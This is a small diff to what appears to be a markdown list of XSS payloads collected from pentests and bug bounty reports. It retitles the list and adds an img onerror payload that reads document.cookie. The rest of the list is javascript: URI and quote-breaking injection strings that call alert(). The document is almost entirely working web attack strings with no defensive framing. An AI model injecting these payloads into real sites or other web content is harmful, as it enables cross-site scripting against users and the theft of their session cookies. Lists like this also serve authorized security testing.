@@ -1,4 +1,4 @@
-## Some working XSS payloads from pentests and bug bounty reports 
+## Some working XSS payloads collected from recent pentests and bug bounty reports 
 
 - javascript://%0dalert() 
 - javascript:/**/%0aalert()
@@ -6,3 +6,4 @@
 - Ah'-alert('k0imet')-'?=
 - <Button href="javascript://%0aalert(document.domain)">XSS</Button>
 - javascript:alert(document.domain)
+- <img src=x onerror=alert(document.cookie)>
